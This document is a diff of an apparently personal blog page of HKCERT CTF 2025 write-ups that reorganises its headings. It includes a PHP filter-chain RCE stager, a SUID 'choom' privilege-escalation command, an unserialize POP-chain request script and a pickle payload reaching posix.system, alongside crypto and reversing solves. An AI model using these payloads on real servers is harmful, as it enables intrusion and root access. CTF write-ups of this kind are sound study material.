@@ -1,13 +1,11 @@
 ---
 title: "HKCERT CTF 2025 — Writeup"
-description: "My HKCERT CTF 2025 writeups: renderme web RCE and privesc, plus crypto (cruel_rsa, EC Fun, Loss N, Bivariate copper, Triple Key Cipher), misc pickle jail, reverse (easyjar SM4, findkey), and a PHP POP-chain web bug."
+description: "My HKCERT CTF 2025 writeups: renderme web RCE and privesc, plus crypto (cruel_rsa, EC Fun, Loss N, Bivariate copper, Triple Key Cipher), a pickle jail, reverse (easyjar SM4, findkey), and a PHP POP-chain web bug."
 date: 2026-03-17T00:40:00+0800
-lastmod: 2026-08-06T01:10:38+0800
+lastmod: 2026-08-06T01:35:00+0800
 tag: "CTF, HKCERT CTF, Web Exploitation, Cryptography, Reverse Engineering"
 lang: en-US
 ---
-
-# Introduction
 
 This page collects my HKCERT CTF 2025 writeups. `renderme` came first, and I have since added the rest from my saved solve scripts.
 
@@ -15,19 +13,36 @@ This page collects my HKCERT CTF 2025 writeups. `renderme` came first, and I hav
 
 A note on flags: I wrote these up from the solve scripts I kept, and some of those scripts did not record the final flag string. Where that is the case I say so rather than guess. The method is what matters, and each script is reproducible against the original challenge.
 
-## renderme
+## Contents
 
-`renderme` is a very fun Web Exploitation challenge because it is not just one single trick. You need to first get code execution, then calm down and enumerate the machine properly, and only then do the privilege escalation.
+| Category | Challenge | Class of bug |
+|---|---|---|
+| Web Exploitation | renderme | PHP filter-chain LFI to RCE, then SUID privesc |
+| Web Exploitation | r | PHP object injection with a back-reference POP chain |
+| Miscellaneous | easyJail | Pickle jail past a substring blocklist |
+| Cryptography | cruel_rsa | Partial private-key exposure on structured primes |
+| Cryptography | EC Fun | Discrete log on a disguised group, 54-bit key |
+| Cryptography | Loss N | RSA with the modulus missing, consecutive primes |
+| Cryptography | Bivariate copper | Tiny factor plus a bivariate Coppersmith relation |
+| Cryptography | Triple Key Cipher | Oracle recovery, invertible mod 256 |
+| Reverse Engineering | easyjar | Reimplement a hand-rolled SM4 to decrypt |
+| Reverse Engineering | findkey | Single-byte XOR over stored strings |
 
-### Challenge Overview
+---
 
-The goal of this challenge was straightforward: get RCE on the target, escalate privileges, and read the root flag.
+## Web Exploitation
+
+### renderme
+
+#### Overview
+
+`renderme` is a very fun Web Exploitation challenge because it is not just one single trick. You need to first get code execution, then calm down and enumerate the machine properly, and only then do the privilege escalation. The goal was straightforward: get RCE on the target, escalate privileges, and read the root flag.
 
 After looking at the application behavior for a bit, it was pretty clear that user-controlled input was reaching a file inclusion sink. Once I saw that, my first thought was immediately `php://filter`, because this kind of bug often turns into LFI-to-RCE if the backend uses `include` or `require` carelessly.
 
-### Initial Access - PHP Filter Chain RCE
+#### Insight
 
-The main bug here was that we could control data that eventually ended up inside a PHP file inclusion path. Instead of going down the usual path like log poisoning or upload tricks, I decided to use the PHP filter chain technique.
+The main bug was that we could control data that eventually ended up inside a PHP file inclusion path. Instead of going down the usual path like log poisoning or upload tricks, I used the PHP filter chain technique.
 
 The theory is simple, but the actual payload is super ugly:
 
@@ -37,19 +52,17 @@ The theory is simple, but the actual payload is super ugly:
 4. Build a base64-encoded PHP payload in memory.
 5. Decode it back into executable PHP before the final include happens.
 
-In this case, the small stager I used was:
+The small stager I used was:
 
 ```php
 <?=require$_POST[1]?>
 ```
 
-I like this kind of stager because the first payload stays very small, while the actual second-stage payload can be sent later through `$_POST[1]`.
+I like this kind of stager because the first payload stays very small, while the actual second-stage payload can be sent later through `$_POST[1]`. That is very useful when the injection point is annoying, filtered, or has length restrictions.
 
-That is very useful when the injection point is annoying, filtered, or has length restrictions.
+#### Exploitation
 
-Of course, I did not generate the filter chain by hand. That would be painful. I used a helper script to automate the generation and get an interactive shell.
-
-(https://github.com/synacktiv/php_filter_chain_generator)
+I did not generate the filter chain by hand. That would be painful. I used a [helper script](https://github.com/synacktiv/php_filter_chain_generator) to automate the generation and get an interactive shell.
 
 ```python
 import base64
@@ -173,36 +186,14 @@ if __name__ == '__main__':
     main()
 ```
 
-### Shell Access and Enumeration
-
-After the payload landed properly, I got code execution as `www-data`.
-
-Basic enumeration showed:
+After the payload landed properly, I got code execution as `www-data`. Basic enumeration showed:
 
 - Debian GNU/Linux 13 (`trixie`)
 - user: `www-data`
 - host kernel exposed as `4.18.0-240.el8.x86_64`
 - the target was running inside a Docker-like containerized environment
 
-That last point matters a lot. A kernel version might look old and juicy at first glance, but once Docker or some containerized environment gets involved, a lot of public kernel privesc ideas become a waste of time.
-
-### Privilege Escalation
-
-At this stage I just did the usual thing, enumerate first, then decide what looks realistic.
-
-#### Failed Attempts
-
-Since the host kernel looked relatively old, I did try a few known kernel privesc directions first. None of them worked.
-
-Looking back, that was not very surprising:
-
-- the environment was containerized
-- required kernel features were likely unavailable
-- the kernel might already have had the relevant fixes
-
-I also ran the normal enumeration flow to check writable paths, services, sudo rules, and other common misconfigurations.
-
-#### PrivEsc - SUID `choom`
+That last point matters a lot. A kernel version might look old and juicy at first glance, but once Docker or some containerized environment gets involved, a lot of public kernel privesc ideas become a waste of time. I did try a few known kernel privesc directions first, and none of them worked, which was not surprising in a container where the required features are likely unavailable or already patched.
 
 The actual breakthrough came from enumerating SUID binaries:
 
@@ -210,17 +201,7 @@ The actual breakthrough came from enumerating SUID binaries:
 find / -perm -4000 2>/dev/null
 ```
 
-One binary stood out:
-
-```bash
-/usr/bin/choom
-```
-
-`choom` is normally just a utility for adjusting the OOM killer score of a process. But once it is exposed as a SUID root binary and does not drop privileges properly, it turns into a very nice privesc vector.
-
-This is a known GTFOBins trick, so after spotting it, the path was basically clear.
-
-So instead of wasting more time on kernel stuff, I just used it directly:
+One binary stood out: `/usr/bin/choom`. It is normally just a utility for adjusting the OOM killer score of a process, but once it is exposed as a SUID root binary and does not drop privileges properly, it turns into a very nice privesc vector. This is a known GTFOBins trick, so after spotting it the path was clear:
 
 ```bash
 /usr/bin/choom -n 0 -- cat /root/flag
@@ -232,32 +213,29 @@ That was enough to read the root flag and finish the challenge cleanly.
 flag{T4x3EMg2KD6J3VfCPvOiDqF17ntodEsU}
 ```
 
-### Final Thoughts
+#### Root cause
 
-What I liked about this challenge is that it did not stop at one clever web trick. It forced a full chain:
+What I liked about this challenge is that it did not stop at one clever web trick. It forced a full chain: identify the PHP inclusion weakness, turn it into RCE with the filter-chain technique, do realistic post-exploitation enumeration, avoid tunnel vision on kernel exploits, and notice the much simpler SUID privesc route.
 
-- identify the PHP inclusion weakness
-- turn it into RCE with the filter-chain technique
-- do realistic post-exploitation enumeration
-- avoid tunnel vision on kernel exploits
-- notice the much simpler SUID privesc route
-
-The main lesson here is the same as always, after getting a shell, do not rush blindly into fancy exploits. Slow down, enumerate properly, and look for the boring stuff too. A lot of the time, the intended privesc is much simpler than the one you are trying to force.
+The main lesson is the same as always. After getting a shell, do not rush blindly into fancy exploits. Slow down, enumerate properly, and look for the boring stuff too. A lot of the time, the intended privesc is much simpler than the one you are trying to force.
 
 我幾鐘意呢類 RCE 類別既, 因為我 Prefer HackTheBox/TryHackMe 類既 hack 機拎 shell 題目 ... :)
 
-### Reference
+References: [GTFOBins choom](https://gtfobins.github.io/gtfobins/choom/#suid) and [Synacktiv on PHP filter chains](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it).
 
-- [GTFOBins - choom](https://gtfobins.github.io/gtfobins/choom/#suid)
-- [Synacktiv - PHP filters chain](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)
+Flag: `flag{T4x3EMg2KD6J3VfCPvOiDqF17ntodEsU}`
 
-## r
+### r
+
+#### Overview
 
 `r` is a PHP object-injection challenge. The entry point unserializes attacker input into a `RequestHandler`, and the trick is chaining two handlers so the anonymous-class instance is reused by reference.
 
-### The POP chain
+#### Insight
 
 The payload builds two `RequestHandler` objects in an array. The first constructs an anonymous class whose file path points at `index.php`, and the second reuses that same object through a serialization back-reference (`r:3`), calling its `execute` method with the `cmd` parameter. The back-reference is what makes the object act as both the constructed handler and the executed one.
+
+#### Exploitation
 
 ```python
 import requests
@@ -289,15 +267,27 @@ for l in [10, 6, 11, 9, 5]:
         break
 ```
 
-The unknown is the line number inside `index.php` where the anonymous class resolves, so the script sweeps a few likely values. The root cause is the usual one: never `unserialize` untrusted input when POP gadgets exist in scope.
+The unknown is the line number inside `index.php` where the anonymous class resolves, so the script sweeps a few likely values.
 
-## easyJail (Miscellaneous)
+#### Root cause
+
+The usual one: never `unserialize` untrusted input when POP gadgets exist in scope. The back-reference trick shows how little the class needs to expose for injection to work. My saved script did not record the flag.
+
+---
+
+## Miscellaneous
+
+### easyJail
+
+#### Overview
 
 A Python pickle jail. The server blocks certain tokens with an `if token in data` substring check over the raw payload, so `os`, `sys`, and `set` can never appear literally.
 
-### Bypassing the substring filter with octal escapes
+#### Insight
 
-Pickle string opcodes accept octal escapes, so the banned words can be spelled without their literal bytes ever appearing. The payload pushes `logging.root`, builds `posix.system` via `STACK_GLOBAL`, and calls it through `__setstate__`:
+Pickle string opcodes accept octal escapes, so the banned words can be spelled without their literal bytes ever appearing. The payload pushes `logging.root`, builds `posix.system` via `STACK_GLOBAL`, and calls it through `__setstate__`.
+
+#### Exploitation
 
 ```python
 import base64
@@ -323,15 +313,25 @@ payload = (
 print(base64.b64encode(payload).decode())
 ```
 
-The lesson is that a substring blocklist over serialized data is not a sandbox. Pickle is code execution by design, and its escapes defeat naive filters.
+#### Root cause
 
-## cruel_rsa (Cryptography)
+A substring blocklist over serialized data is not a sandbox. Pickle is code execution by design, and its escapes defeat naive filters. My saved script did not record the flag.
+
+---
+
+## Cryptography
+
+### cruel_rsa
+
+#### Overview
 
 An RSA variant where the primes have a shared structure (`p = 2ga + 1`, `q = 2gb + 1`) and the challenge leaks the top and bottom bits of the private exponent `d`. This is a partial-key-exposure attack.
 
-### Approach
+#### Insight
 
-`d` is reconstructed as `d = dm * 2^209 + x * 2^74 + dl`, leaving 135 unknown middle bits. The solve sets up the RSA key relation `e*d = 1 + k*L` and uses a lattice/Coppersmith small-root search over the unknown middle, combined with recovering the shared factor `g` (a Blum prime around 226 bits). Once `d` is complete, the message decrypts directly.
+`d` is reconstructed as `d = dm * 2^209 + x * 2^74 + dl`, leaving 135 unknown middle bits. Set up the RSA key relation `e*d = 1 + k*L` and run a lattice/Coppersmith small-root search over the unknown middle, combined with recovering the shared factor `g` (a Blum prime around 226 bits). Once `d` is complete, the message decrypts directly.
+
+#### Exploitation
 
 ```python
 nbit = 512
@@ -344,15 +344,21 @@ unknown_bits = shift_high - lsbit  # 135
 # d = dm << 209 + x << 74 + dl, solve x via Coppersmith, then decrypt.
 ```
 
-The full Sage script (lattice construction and factoring) is the artifact for this one. The flag was not recorded in my saved script.
+#### Root cause
 
-## EC Fun (Cryptography)
+Leaking both ends of `d` on structured primes is enough for a lattice attack to fill the gap. The full Sage script (lattice construction and factoring) is the artifact. My saved script did not record the flag.
+
+### EC Fun
+
+#### Overview
 
 A custom group disguised as rational maps over `F_p`. `have` is the group law and `fun` is a doubling-style map, together implementing scalar multiplication of a hidden 54-bit key. The goal is a discrete log.
 
-### Approach
+#### Insight
 
 The key is only 54 bits, so a meet-in-the-middle baby-step giant-step over the custom group recovers it, using the map's own operations for the steps. Once the key is known, it is the AES key for the flag ciphertext.
+
+#### Exploitation
 
 ```python
 def scalar_mult(point, k):
@@ -368,15 +374,21 @@ def scalar_mult(point, k):
 # BSGS over the custom group to recover the 54-bit key, then AES-ECB decrypt.
 ```
 
-The takeaway is that dressing up a group as opaque polynomial fractions does not raise the discrete-log difficulty when the exponent is only 54 bits. The flag was not recorded in my saved script.
+#### Root cause
 
-## Loss N (Cryptography)
+Dressing up a group as opaque polynomial fractions does not raise the discrete-log difficulty when the exponent is only 54 bits. My saved script did not record the flag.
+
+### Loss N
+
+#### Overview
 
 RSA where you are given `c`, `d`, and `e` but not the modulus `n`. The primes are consecutive (`q = next_prime(p)`), so they are close.
 
-### Recovering n from d
+#### Insight
 
 Since `e*d - 1 = k*phi(n)`, iterate small `k`, take `phi_n = (e*d - 1)/k`, and because `p` and `q` are adjacent, `p ≈ sqrt(phi_n)`. Search a small window around that square root for a prime `p` whose `(p-1)(q-1)` matches `phi_n`, then rebuild `n` and decrypt.
+
+#### Exploitation
 
 ```python
 ed_minus_1 = e * d - 1
@@ -395,15 +407,21 @@ for k in range(1, 100000):
             # decrypt pow(c, d, n)
 ```
 
-Missing `n` is not much protection when `d` is known and the primes are consecutive. The flag was not recorded in my saved script.
+#### Root cause
 
-## Bivariate copper (Cryptography)
+Missing `n` is not much protection when `d` is known and the primes are consecutive. My saved script did not record the flag.
+
+### Bivariate copper
+
+#### Overview
 
 An RSA challenge with a tiny factor plus a bivariate Coppersmith relation over two leaked, partially known values.
 
-### Approach
+#### Insight
 
 `N` has a small factor, so trial division up to `2^25` splits it and the message decrypts by normal RSA. The remaining structure is two equations in unknowns `x1`, `x2` that are small (bounded by `2^244`), recovered by searching small `x1` and solving for a valid `x2` under the bound.
+
+#### Exploitation
 
 ```python
 for candidate_q in range(2, 2**25):
@@ -414,15 +432,21 @@ d = inverse(e, (p - 1) * (q - 1))
 # message = pow(c, d, N); then solve the bivariate relation for the small roots.
 ```
 
-A small factor makes `N` splittable outright, which undercuts the whole scheme. The flag was not recorded in my saved script.
+#### Root cause
 
-## Triple Key Cipher (Cryptography)
+A small factor makes `N` splittable outright, which undercuts the whole scheme. My saved script did not record the flag.
+
+### Triple Key Cipher
+
+#### Overview
 
 A remote encryption oracle built on a custom byte cipher with a per-byte leak. The C source `triKeyEnc.c` describes the round, and the attack is an oracle recovery using modular inverses mod 256.
 
-### Approach
+#### Insight
 
 The `hash_msg` step truncates and SHA-256s the input, and the cipher mixes bytes with operations invertible mod 256. Querying the oracle with chosen messages and reading the leak lets you invert the key bytes one at a time via the modular inverse.
+
+#### Exploitation
 
 ```python
 def mod_inverse(a, m=256):
@@ -437,15 +461,25 @@ def mod_inverse(a, m=256):
 # Query oracle, read per-byte leak, invert key bytes mod 256.
 ```
 
-Byte operations that are invertible mod 256, plus a per-byte leak, give a clean oracle attack. The full pwntools client is the artifact. The flag was not recorded in my saved script.
+#### Root cause
 
-## easyjar (Reverse Engineering)
+Byte operations that are invertible mod 256, plus a per-byte leak, let you invert the key one byte at a time. The full pwntools client is the artifact. My saved script did not record the flag.
 
-A Java jar that encrypts the flag with a hand-rolled **SM4** implementation (`Sm4.class`). SM4 is a standard block cipher, so the whole thing is reversible once you port the S-box and key schedule out of the decompiled class.
+---
 
-### Reimplementing SM4 to decrypt
+## Reverse Engineering
+
+### easyjar
+
+#### Overview
+
+A Java jar that encrypts the flag with a hand-rolled SM4 implementation (`Sm4.class`). SM4 is a standard block cipher, so the whole thing is reversible once you port the S-box and key schedule out of the decompiled class.
+
+#### Insight
 
 The solve reconstructs SM4 from the `Sm4.java` constants: the S-box (converted from signed Java bytes), the `FK` and `CK` schedule constants, and a modified `SBOX_P` built in the class's static block with an `0xA7` tweak and a per-index rotate. With the cipher rebuilt, decrypting is running SM4 in reverse.
+
+#### Exploitation
 
 ```python
 SBOX = [b & 0xFF for b in SBOX_RAW]           # signed -> unsigned
@@ -462,19 +496,27 @@ def T(n):
     return t ^ rotl(t, 2) ^ rotl(t, 10) ^ rotl(t, 18) ^ rotl(t, 24)
 ```
 
-A custom SM4 is still SM4. Port the constants faithfully and the key schedule inverts. The flag was not recorded in my saved script.
+#### Root cause
 
-## findkey (Reverse Engineering)
+Renaming the class does not change the cipher. Once the constants are ported faithfully, the SM4 key schedule inverts and the flag decrypts. My saved script did not record the flag.
+
+### findkey
+
+#### Overview
 
 A small binary that stores its strings XOR-encoded with a few single-byte keys.
 
-### XOR key recovery
+#### Insight
 
 Three keys show up in the binary (`0x0B` for the prompt, `0x02` for the error, `0x21` for the success message). Decoding each suspicious string with its key reveals the plaintext, and a hidden 16-byte block gives the key material for the flag.
+
+#### Exploitation
 
 ```python
 def multi_xor_decode(s):
     return {hex(k): "".join(chr(ord(c) ^ k) for c in s) for k in (0x0B, 0x02, 0x21)}
 ```
 
-Single-byte XOR over stored strings is trivially recoverable once the keys are read out of the binary. Note this is an AIS3-format challenge (`AIS3{...}`) that appeared in the set; the recovered inner value was `278-362-75136019`.
+#### Root cause
+
+Single-byte XOR over stored strings is trivially recoverable once the keys are read out of the binary. This is an AIS3-format challenge (`AIS3{...}`) that appeared in the set; the recovered inner value was `278-362-75136019`.
